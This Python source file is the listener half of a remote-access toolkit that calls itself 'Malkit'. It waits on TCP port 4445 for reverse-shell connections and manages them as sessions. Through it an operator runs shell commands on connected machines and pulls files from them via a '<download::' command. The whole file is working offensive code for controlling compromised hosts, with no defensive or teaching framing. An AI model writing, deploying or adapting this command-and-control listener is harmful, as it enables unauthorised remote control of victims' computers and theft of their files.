import os
import socket
import sys
import time
from threading import Thread

from progress.spinner import Spinner
if sys.platform == "linux":
    import readline
    linux = True
else:
    from _pline import console
    linux = False

sessions = []
alive = True
listening = False
port = 0
holder = 0

# key codes
BACKSPACE = 8
lCONTROL_L = (76, 40)
rCONTROL_L = (76, 36)
CONTROL_L = [lCONTROL_L, rCONTROL_L]
ENTER = 13
UP_ARROW = 38
DOWN_ARROW = 40
TAB = 9
TAB_state = (9, 32)

memory = -1
history = []

def transfer(conn, command):
    try:
        conn.send(command.encode())
        grab, src, dst = command.split("::")
        dst_directory = '/'.join(dst.replace("\\", "/").split("/")[:-1])
        print(dst_directory)
        if not dst_directory.endswith("/"):
            dst_directory += "/"
        if not os.path.exists(dst_directory):
            os.makedirs(dst_directory)
        bits = b""
        while True:
            print("Transferring file...", end="\r")
            bits += conn.recv(1024)
            if bits.startswith(b"File not found"):
                print('[-] Unable to find out the file')
                break
            elif bits.endswith(b"DONE"):
                bits = bits[:-4]
                break
        with open(dst, "wb") as f:
            f.write(bits)
            print(f"File written Successfully at: {dst}")
            return 0
    except Exception as e:
        print(f"Unknown Exception: {e}")
        return 1


def clear():
    if sys.platform != "linux":
        os.system("cls")
    else:
        os.system("clear")


def die():
    global alive
    alive = False
    print("\n[+] Cleaning up...")
    time.sleep(1)
    spinner = Spinner("Exiting...")
    for _ in range(10):
        spinner.next()
        time.sleep(0.1)
    spinner.finish()
    clear()
    if linux:
        os.system("reset")
        sys.exit(0)
    print("[+] Exited Successfully")
    os._exit(1)


def run_server():
    global port
    global listening
    host = "0.0.0.0"
    port = 4445
    s = socket.socket()
    if linux:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tries = 60
    for conTry in range(tries):
        try:
            s.bind((host, port))
            print(
                f'\n[+] Listening for TCP connections on port {port}...\n')
            break
        except OSError:
            print(
                f"oops, problem with socket. Retrying...[{conTry}/{tries}s]", end="\r")
            time.sleep(1)
            continue
        print("Couldn't fix socket problem. Try again.")
        die()
    listening = True
    s.listen(10)
    while alive:
        try:
            client, addr = s.accept()
            num = len(sessions)
            session = [num, client, addr, 0]
            sessions.append(session)
        except Exception as err:
            print(err)
    s.close()
    return 0


def help():
    help_screen = """
Malkit Listener Help Screen!

The commands are split into two categories:

    [Listener commands]: the ones you can use inside the "Listener>" screen.

    [Shell commands]: the ones you can use inside the "Shell>" screen after interacting with a session.


[Listener Commands]

list    -   lists all active sessions in the format: SessionNumber: IP/PORT
interact::SessionNumber    -   Allows you to interact with a session number. Example: interact::0
kill::SessionNumber    -   Kills a specific session number. Example: kill::0
exit    -   Exits the listener, same effect as a KeyboardInterrupt
help    -   Shows this screen


[Shell Commands]

<bg or <background  -   Backgrounds the current session, allowing you to return to the lister.
<download::RemotePath::LocalPath    -   Downloads a file from the remote system into your local one.
                                    -   Example: <download::remote_file.txt::savehere/files/downloaded.txt 
exit or <exit   -   Kills the current shell, returning you into the listener

"""
    print(help_screen)
    return 0


commands_listener = ["help ", "kill ", "list ", "interact::", "exit "]
commands_shell = ["<bg ", "<background ", "<download::", "<exit", "<help"]

def completer_listener_linux(text, state):
    for cmd in commands_listener:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1


def completer_shell_linux(text, state):
    for cmd in commands_shell:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1


def completer_listener(text):
    return [i for i in commands_listener if (i.startswith(text) and len(text) > 0)]


def completer_shell(text):
    return [i for i in commands_shell if (i.startswith(text) and len(text) > 0)]


def handle_keys(buffer, state, completer):
    try:
        global memory
        global history
        key = c.getkeypress()
        keycode = key.keycode
        keystate = key.state
        buflen = len(buffer)
        keychar = key.char
        if keycode == BACKSPACE:
            if buflen >= 1:
                c.write('\b \b')
                buffer = buffer[:-1]
        elif (keycode, keystate) == lCONTROL_L or (keycode, keystate) == rCONTROL_L:
            clear()
            return "FLUSH", buffer
        elif (keycode, keystate) == TAB_state:
            if completer == "listener":
                options = completer_listener(buffer)
            elif completer == "shell":
                options = completer_shell(buffer)
            option_len = len(options)
            if option_len == 1:
                completed = options[0]
                start_point = buflen
                diff = completed[start_point:]
                c.write(diff)
                buffer += diff
            elif option_len > 1 and option_len <= 10:
                c.write("\n")
                for option in options:
                    c.write(option + "    ")
                c.write("\n" + state + buffer)
        elif keycode == ENTER:
            if len(buffer) > 0:
                history.append(buffer)
                memory = len(history)
            c.pos(y=0)
            c.write("\n")
            return (True, buffer)
        elif keycode == UP_ARROW:
            if len(history) > 0:
                if memory - 1 >= 0:
                    memory -= 1
                if memory >= 0:
                    for _ in range(len(buffer)):
                        c.write('\b \b')
                    buffer = history[memory]
                    c.write(history[memory])
        elif keycode == DOWN_ARROW:
            if len(history) > 0:
                if memory + 1 <= len(history):
                    memory += 1
                if memory > 0 and memory < len(history):
                    for _ in range(len(buffer)):
                        c.write('\b \b')
                    buffer = history[memory]
                    c.write(history[memory])
                elif memory == len(history):
                    for _ in range(len(buffer)):
                        c.write('\b \b')
                    buffer = ""

        else:
            c.write(keychar)
            buffer += keychar
            return (False, buffer)
        return (False, buffer)
    except Exception as err:
        return (None, buffer)


def handle_client():
    global sessions
    global holder
    buffer = ""
    while not listening:
        continue
    state_listen = f"Listener> "
    while alive:
        try:
            if not linux:
                c.write(state_listen)
                while True:
                    enter_state, buffer = handle_keys(
                        buffer, state_listen, "listener")
                    if enter_state:
                        if enter_state == "FLUSH":
                            c.write(state_listen)
                            continue
                        else:
                            com, *arg = buffer.split(" ")
                            buffer = ""
                            break
                    else:
                        continue
            else:
                readline.parse_and_bind("tab: complete")
                readline.set_completer(completer_listener_linux)
                com, *arg = input(f"Listener> ").split("::")
                com = com.strip()
            arg = ''.join(arg).lower()
            if com == "cls" or com == "clear" or com.encode() == b'\x0c':
                clear()
            elif com.lower() == "help":
                help()
                continue
            elif com == "exit":
                die()
            elif com == "list":
                if len(sessions) == 0:
                    print("No sessions at the moment")
                    continue
                print(f"\nNumber of sessions: {len(sessions)}\n")
                for x in sessions:
                    print(f"{x[0]}: {x[2][0]} / {x[2][1]} (remote: {port})")
                print("\n")
            elif com == "kill":
                try:
                    int_arg = int(arg)
                    sessions.pop(int_arg)
                    holder -= 1
                except Exception as e:
                    print("error", e)
            elif com.startswith("interact"):
                try:
                    comm, snum = com.split("::")
                    conn = sessions[int(snum)][1]
                    state_shell = f"[{snum}] Shell>"
                except:
                    print("make sure you did it right")
                    continue
                while alive:
                    try:
                        if not linux:
                            c.write(state_shell)
                            buffer = ""
                            while True:
                                enter_state, buffer = handle_keys(
                                    buffer, state_shell, "shell")
                                if enter_state:
                                    if enter_state == "FLUSH":
                                        c.write(state_shell)
                                        continue
                                    else:
                                        command = buffer
                                        buffer = ""
                                        break
                                else:
                                    continue
                        else:
                            readline.parse_and_bind("tab: complete")
                            readline.set_completer(completer_listener_linux)
                        if command == "<exit":
                            sessions.pop(int(snum))
                            buffer = ""
                            break
                        elif command == 'cls' or command == 'clear' or command.encode() == b'\x0c':
                            clear()
                            continue
                        elif command == "<bg" or command == "<background":
                            print(f"Backgrounded: {snum}")
                            break
                        elif command.startswith('<download'):
                            try:
                                grab, src, dst = command.split("::")
                                transfer(conn, command)
                            except Exception as e:
                                print(
                                    "Hey, use proper syntax. Example: <download::remotefile::localdestination/localfile.txt")
                            continue

                        elif command.strip() == "":
                            continue
                        elif command.startswith("cd "):
                            conn.send(command.encode())
                            output = b""
                            while True:
                                output += conn.recv(1024)
                                if output.endswith(b"CDDONE"):
                                    print(output.decode().replace("CDDONE", ""))
                                    break
                            continue
                        elif command.lower() == "<help":
                            help()
                            continue
                        else:
                            conn.send(command.encode())
                            output = b""
                            while True:
                                output += conn.recv(1024)
                                if output.endswith(b"CMDDONE"):
                                    print(output.decode().replace(
                                        "CMDDONE", ""))
                                    break
                    except WindowsError:
                        break
                    except (KeyboardInterrupt, EOFError):
                        print("")
                        continue
                    except Exception as err:
                        print(f"Shell Error: [{err}]")
                        continue
        except (KeyboardInterrupt, EOFError):
            break
    return 0


def print_conn():
    global alive
    global sessions
    global holder
    while alive:
        time.sleep(2)
        if len(sessions) > holder:
            diff = len(sessions) - holder
            for x in range(holder, holder + diff):
                print(
                    f'\n[+] Got one! Session {sessions[x][0]} from {sessions[x][2][0]} on port {sessions[x][2][1]} (remote: {port})...\n')
            holder = len(sessions)
    return 0


def run_alive(queue: list):
    for thread in queue:
        thread.setDaemon(True)
        thread.daemon = True
        thread.start()


queue = []
if __name__ == "__main__":

    try:
        if not linux:
            c = console.Console(0)
            sys.stdout = c
            sys.stderr = c

        run_server_thread = Thread(target=run_server)
        print_conn_thread = Thread(target=print_conn)
        # control_timeout = Thread(target=timeout)
        main_server_thread = Thread(target=handle_client)
        #screen_control_thread = Thread(target=screen_control)

        queue.append(run_server_thread)
        queue.append(print_conn_thread)
        # queue.append(screen_control_thread)
        # queue.append(control_timeout)
        queue.append(main_server_thread)

        run_alive(queue)

        while True:
            time.sleep(1)

    except (KeyboardInterrupt, SystemExit):
        die()